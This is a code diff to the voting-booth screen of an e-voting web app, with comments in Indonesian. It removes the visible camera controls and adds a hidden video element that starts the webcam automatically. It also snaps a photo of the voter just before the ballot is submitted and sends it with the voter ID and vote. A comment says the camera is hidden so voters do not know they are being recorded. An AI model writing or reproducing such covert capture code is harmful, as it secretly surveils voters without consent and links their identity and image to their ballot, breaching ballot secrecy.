@@ -1,14 +1,13 @@
 /* ============================================================
-   E-VOTE • views-bilik.js (FULL FIX - FINAL)
+   E-VOTE • views-bilik.js (FULL FIX - SILENT CAPTURE)
    Role: BILIK (Antarmuka Bilik Suara)
-   Fitur: Preload, Auto-Sync, Kunci Bilik, Kontrol TTS.
+   Fitur: Kunci Bilik, Kontrol TTS, Foto Otomatis (Background).
    ============================================================ */
 window.ViewsBilik = (function () {
   'use strict';
 
   const POLL_MS   = 2500; // Cek status bilik tiap 2.5 detik
   const PING_MS   = 30000; // Ping heartbeat ke server tiap 30 detik
-  const CAM_MAX   = 320;
   const PHOTO_Q   = 0.7;
   
   const LABELS = {
@@ -74,6 +73,7 @@ window.ViewsBilik = (function () {
     const el = view();
     if (!el) return;
 
+    // ✅ VIDEO DISEMBUNYIKAN (Agar Pemilih Tidak Tahu Sedang Direkam)
     el.innerHTML = `
       <div class="card" id="bilikStatusCard">
         <div class="row-between">
@@ -96,29 +96,24 @@ window.ViewsBilik = (function () {
             <h3 id="activeVoterName">—</h3>
             <p class="hint" id="activeVoterMeta">—</p>
           </div>
-          <div class="row" style="margin:0">
-            <button class="btn-ghost btn-sm" id="btnCamOn" type="button">📷 Kamera</button>
-            <button class="btn-ghost btn-sm" id="btnCamSnap" type="button">📸 Ambil Foto</button>
-          </div>
-        </div>
-        <div id="camWrap" style="margin-top:12px;display:none">
-          <video id="camPreview" autoplay playsinline muted style="width:100%;max-width:${CAM_MAX}px;border-radius:12px;background:#000"></video>
-          <canvas id="photoCanvas" style="display:none"></canvas>
-          <div id="photoThumb" style="margin-top:8px"></div>
         </div>
       </div>
 
       <div id="voteArea"></div>
-    `;
 
-    const btnCamOn = document.getElementById('btnCamOn');
-    const btnCamSnap = document.getElementById('btnCamSnap');
-    if (btnCamOn) btnCamOn.onclick = () => startCamera();
-    if (btnCamSnap) btnCamSnap.onclick = () => capturePhoto(false);
+      <!-- ✅ ELEMEN KAMERA TERSEMBUNYI -->
+      <div style="display:none;">
+        <video id="camPreview" autoplay playsinline muted></video>
+        <canvas id="photoCanvas"></canvas>
+      </div>
+    `;
 
     // ✅ Preload Settings & Candidates menggunakan Cache
     await loadSettings();
     await loadCandidates();
+
+    // ✅ Otomatis nyalakan kamera saat masuk bilik (Silent)
+    startSilentCamera();
 
     API.post('booth.ping').catch(() => {});
     pingTimer = setInterval(() => {
@@ -132,7 +127,7 @@ window.ViewsBilik = (function () {
 
   async function loadSettings() {
     try {
-      const r = await fetchData('settings.public', {}, true); // Force true agar selalu fresh
+      const r = await fetchData('settings.public', {}, true);
       if (r && r.success) state.settings = r.data || {};
     } catch (_) {}
   }
@@ -148,6 +143,45 @@ window.ViewsBilik = (function () {
   }
 
   /* ============================================================
+   *  SILENT CAMERA & CAPTURE
+   *  ============================================================ */
+  async function startSilentCamera() {
+    if (cameraStream) return;
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      console.warn('Browser tidak mendukung kamera');
+      return;
+    }
+    try {
+      cameraStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: { ideal: 640 } }, audio: false
+      });
+      const video = document.getElementById('camPreview');
+      if (video) video.srcObject = cameraStream;
+    } catch (e) {
+      console.warn('Kamera silent gagal diakses:', e.message);
+    }
+  }
+
+  function captureSilent() {
+    const video = document.getElementById('camPreview');
+    const canvas = document.getElementById('photoCanvas');
+    if (!video || !canvas) return null;
+    if (!video.videoWidth) return null;
+
+    try {
+      canvas.width  = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      const dataUrl = canvas.toDataURL('image/jpeg', PHOTO_Q);
+      state.photo = dataUrl;
+      return dataUrl;
+    } catch (err) {
+      console.warn('Gagal capture silent:', err);
+      return null;
+    }
+  }
+
+  /* ============================================================
    *  REFRESH STATUS (GATEKEEPER LOGIC)
    * ============================================================ */
   async function refreshBooth() {
@@ -159,7 +193,6 @@ window.ViewsBilik = (function () {
 
     loadingBooth = true;
     try {
-      // ✅ Gunakan fetchData (Cache) dengan forceRefresh true agar status kunci terbaru didapat
       const r = await fetchData('booth.status', {}, true);
       if (!r || !r.success) return;
 
@@ -211,7 +244,6 @@ window.ViewsBilik = (function () {
       state.photo = null;
       renderVoting();
 
-      if (cameraStream) setTimeout(() => capturePhoto(true), 700);
     } catch (err) {
       console.warn('[bilik] loadActiveVoter error:', err);
     } finally {
@@ -226,8 +258,6 @@ window.ViewsBilik = (function () {
 
     const card = document.getElementById('bilikActiveCard');
     if (card) card.style.display = 'none';
-    const thumb = document.getElementById('photoThumb');
-    if (thumb) thumb.innerHTML = '';
 
     renderWaiting();
   }
@@ -343,52 +373,7 @@ window.ViewsBilik = (function () {
   }
 
   /* ============================================================
-   *  CAMERA
-   * ============================================================ */
-  async function startCamera() {
-    if (cameraStream) { UI.toast('Kamera sudah aktif', 'info'); return; }
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      UI.toast('Browser tidak mendukung kamera', 'error'); return;
-    }
-    try {
-      cameraStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'user', width: { ideal: 640 } }, audio: false
-      });
-      const video = document.getElementById('camPreview');
-      const wrap = document.getElementById('camWrap');
-      if (video) video.srcObject = cameraStream;
-      if (wrap) wrap.style.display = 'block';
-      UI.toast('Kamera aktif', 'success');
-    } catch (e) {
-      cameraStream = null;
-      UI.toast('Kamera tidak bisa diakses: ' + (e.message || ''), 'error');
-    }
-  }
-
-  function capturePhoto(silent) {
-    const video = document.getElementById('camPreview');
-    const canvas = document.getElementById('photoCanvas');
-    if (!video || !canvas) return;
-    if (!video.videoWidth) { if (!silent) UI.toast('Kamera belum siap', 'error'); return; }
-
-    try {
-      canvas.width  = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      state.photo = canvas.toDataURL('image/jpeg', PHOTO_Q);
-
-      const thumb = document.getElementById('photoThumb');
-      if (thumb) {
-        thumb.innerHTML = `<img src="${state.photo}" alt="Foto" style="max-width:120px;border-radius:10px;border:1px solid var(--border)">`;
-      }
-      if (!silent) UI.toast('Foto tersimpan', 'success');
-    } catch (err) {
-      if (!silent) UI.toast('Gagal ambil foto: ' + err.message, 'error');
-    }
-  }
-
-  /* ============================================================
-   *  SUBMIT VOTE (AUTO-LOCK)
+   *  SUBMIT VOTE (AUTO-CAPTURE FOTO)
    * ============================================================ */
   async function submitVote(blank) {
     if (state.submitting) return;
@@ -435,7 +420,10 @@ window.ViewsBilik = (function () {
     if (btnBlank)  { btnBlank.disabled = true; }
 
     try {
-      const payload = { voterId: v.id, votes: votes, photoUrl: state.photo || '' };
+      // ✅ SILENT CAPTURE: Jepret foto tepat sebelum data dikirim
+      const photoData = captureSilent();
+
+      const payload = { voterId: v.id, votes: votes, photoUrl: photoData || '' };
       const r = await API.post('vote.submit', payload);
 
       if (!r || !r.success) {
@@ -445,12 +433,6 @@ window.ViewsBilik = (function () {
 
       UI.toast('Suara tersimpan. Terima kasih!', 'success');
       try { Voice.speak('Terima kasih. Suara Anda telah tersimpan.'); } catch (_) {}
-
-      stopCamera();
-      const wrap = document.getElementById('camWrap');
-      if (wrap) wrap.style.display = 'none';
-      const thumb = document.getElementById('photoThumb');
-      if (thumb) thumb.innerHTML = '';
 
       state.voter = null;
       state.photo = null;
@@ -468,7 +450,6 @@ window.ViewsBilik = (function () {
           </div>`;
       }
 
-      // Refresh akan mendeteksi bilik sudah terkunci kembali
       refreshBooth();
     } catch (err) {
       UI.toast('Koneksi bermasalah: ' + (err.message || err), 'error');
@@ -486,9 +467,6 @@ window.ViewsBilik = (function () {
    * ============================================================ */
   return {
     dashboard,
-    startCamera,
-    capturePhoto,
-    submitVote,
     _clearAllPolls: cleanup
   };
 })();
